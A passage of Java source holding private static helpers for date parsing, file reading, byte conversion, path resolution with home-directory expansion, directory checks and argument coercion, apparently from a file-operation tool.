            if (parsed > 0) {
                return parsed;
            }
        }
        return System.currentTimeMillis();
    }

    private static String normalizeTimezoneText(String text) {
        int len = text == null ? 0 : text.length();
        if (len < 6) {
            return text;
        }
        int signIndex = Math.max(text.lastIndexOf('+'), text.lastIndexOf('-'));
        if (signIndex <= 0 || signIndex + 5 >= len) {
            return text;
        }
        if (text.charAt(signIndex + 3) != ':') {
            return text;
        }
        return text.substring(0, signIndex + 3) + text.substring(signIndex + 4);
    }

    private static long parseIsoDate(String text, String pattern) {
        try {
            SimpleDateFormat format = new SimpleDateFormat(pattern);
            Date date = format.parse(text);
            if (date != null) {
                return date.getTime();
            }
        } catch (Exception ignored) {
        }
        return -1L;
    }

    private static String isoTime(long epochMs) {
        SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
        format.setTimeZone(TimeZone.getTimeZone("UTC"));
        return format.format(new Date(epochMs));
    }

    private static byte[] readAllBytes(File file) throws Exception {
        FileInputStream input = null;
        ByteArrayOutputStream output = null;
        try {
            input = new FileInputStream(file);
            output = new ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int len;
            while ((len = input.read(buffer)) != -1) {
                output.write(buffer, 0, len);
            }
            return output.toByteArray();
        } finally {
            closeQuietly(input);
            closeQuietly(output);
        }
    }

    private static byte[] asBytes(Object rawValue) {
        if (rawValue == null) {
            return null;
        }
        if (rawValue instanceof byte[]) {
            return (byte[]) rawValue;
        }
        if (rawValue instanceof Iterable<?>) {
            ArrayList<Byte> list = new ArrayList<Byte>();
            Iterator<?> iterator = ((Iterable<?>) rawValue).iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();
                if (!(next instanceof Number)) {
                    throw new IllegalArgumentException("bytes element is not a number: " + next);
                }
                int v = ((Number) next).intValue();
                if (v < 0 || v > 255) {
                    throw new IllegalArgumentException("bytes element out of range: " + v);
                }
                list.add(Byte.valueOf((byte) v));
            }
            byte[] bytes = new byte[list.size()];
            for (int i = 0; i < list.size(); i++) {
                bytes[i] = list.get(i).byteValue();
            }
            return bytes;
        }
        if (rawValue.getClass().isArray()) {
            int length = java.lang.reflect.Array.getLength(rawValue);
            byte[] bytes = new byte[length];
            for (int i = 0; i < length; i++) {
                Object item = java.lang.reflect.Array.get(rawValue, i);
                if (!(item instanceof Number)) {
                    throw new IllegalArgumentException("bytes element is not a number: " + item);
                }
                int v = ((Number) item).intValue();
                if (v < 0 || v > 255) {
                    throw new IllegalArgumentException("bytes element out of range: " + v);
                }
                bytes[i] = (byte) v;
            }
            return bytes;
        }
        throw new IllegalArgumentException("unsupported bytes type: " + rawValue.getClass().getName());
    }

    private static String normalizeCwd(String rawCwd) {
        String cwd = rawCwd;
        if (cwd == null || cwd.length() == 0) {
            cwd = System.getProperty("user.dir", ".");
        }
        File dir = new File(expandHome(cwd));
        if (!dir.isAbsolute()) {
            dir = new File(System.getProperty("user.dir", "."), cwd);
        }
        return canonicalPath(dir);
    }

    private static File resolvePath(Object rawPath, String cwd, boolean required) throws Exception {
        String path = asTrimString(rawPath);
        if (path == null || path.length() == 0) {
            if (required) {
                throw new IllegalArgumentException("path is required");
            }
            return new File(cwd).getCanonicalFile();
        }
        path = expandHome(path);
        File file = new File(path);
        if (!file.isAbsolute()) {
            file = new File(cwd, path);
        }
        return file.getCanonicalFile();
    }

    private static String expandHome(String path) {
        if (path == null) {
            return null;
        }
        if ("~".equals(path)) {
            return System.getProperty("user.home");
        }
        if (path.startsWith("~/") || path.startsWith("~\\")) {
            return System.getProperty("user.home") + path.substring(1);
        }
        return path;
    }

    private static boolean isDescendantPath(File candidate, File parent) throws Exception {
        String candidatePath = candidate.getCanonicalPath();
        String parentPath = parent.getCanonicalPath();
        if (candidatePath.equals(parentPath)) {
            return false;
        }
        String prefix = parentPath.endsWith(File.separator) ? parentPath : parentPath + File.separator;
        return candidatePath.startsWith(prefix);
    }

    private static boolean isSamePath(File a, File b) throws Exception {
        return a.getCanonicalPath().equals(b.getCanonicalPath());
    }

    private static void ensureParent(File file, boolean createParent) throws Exception {
        File parent = file.getParentFile();
        if (parent == null) {
            return;
        }
        if (parent.exists()) {
            if (!parent.isDirectory()) {
                throw new IllegalArgumentException("parent exists but is not a directory: " + parent.getPath());
            }
            return;
        }
        if (!createParent) {
            throw new IllegalArgumentException("parent directory does not exist: " + parent.getPath());
        }
        if (!parent.mkdirs()) {
            throw new IOException("failed to create parent directory: " + parent.getPath());
        }
    }

    private static void ensureExists(File file) {
        if (!file.exists()) {
            throw new IllegalArgumentException("path does not exist: " + file.getPath());
        }
    }

    private static void ensureDirectory(File dir) {
        if (!dir.isDirectory()) {
            throw new IllegalArgumentException("not a directory: " + dir.getPath());
        }
    }

    private static void ensureFile(File file) {
        ensureExists(file);
        if (!file.isFile()) {
            throw new IllegalArgumentException("not a file: " + file.getPath());
        }
    }

    private static void fail(Map<String, Object> result, String errorCode, String message) {
        result.put("errorCode", errorCode);
        result.put("error", message);
    }

    private static String asTrimString(Object value) {
        if (value == null) {
            return null;
        }
        String text = String.valueOf(value).trim();
        return text.length() == 0 ? null : text;
    }

    private static boolean asBoolean(Object value, boolean defaultValue) {
        if (value == null) {
            return defaultValue;
        }
        if (value instanceof Boolean) {
            return ((Boolean) value).booleanValue();
        }
        String text = String.valueOf(value).trim();
        if (text.length() == 0) {
            return defaultValue;
        }
        return Boolean.parseBoolean(text);
    }

    private static long asLong(Object value, long defaultValue) {
        if (value == null) {
            return defaultValue;
        }
        if (value instanceof Number) {
            return ((Number) value).longValue();
        }
        String text = String.valueOf(value).trim();
        if (text.length() == 0) {
            return defaultValue;
        }
        try {
            return Long.parseLong(text);
        } catch (Exception ignored) {
            return defaultValue;
        }
    }

    private static int asInt(Object value, int defaultValue) {
        if (value == null) {
            return defaultValue;
        }
        if (value instanceof Number) {
            return ((Number) value).intValue();
        }
        String text = String.valueOf(value).trim();
        if (text.length() == 0) {
            return defaultValue;
        }
        try {
            return Integer.parseInt(text);
        } catch (Exception ignored) {
            return defaultValue;
        }
    }

    private static String canonicalPath(File file) {
        try {
            return file.getCanonicalPath();
        } catch (Exception ignored) {
            return file.getAbsolutePath();
        }
    }

    private static String safeMessage(Throwable throwable) {
        if (throwable == null) {
            return "unknown error";
        }
        String message = throwable.getMessage();
        if (message == null || message.trim().length() == 0) {
            return throwable.getClass().getSimpleName();
        }
        return message;
    }

    private static void closeQuietly(java.io.Closeable closeable) {
        if (closeable == null) {
            return;
        }
        try {
            closeable.close();
        } catch (Exception ignored) {
        }
    }
}
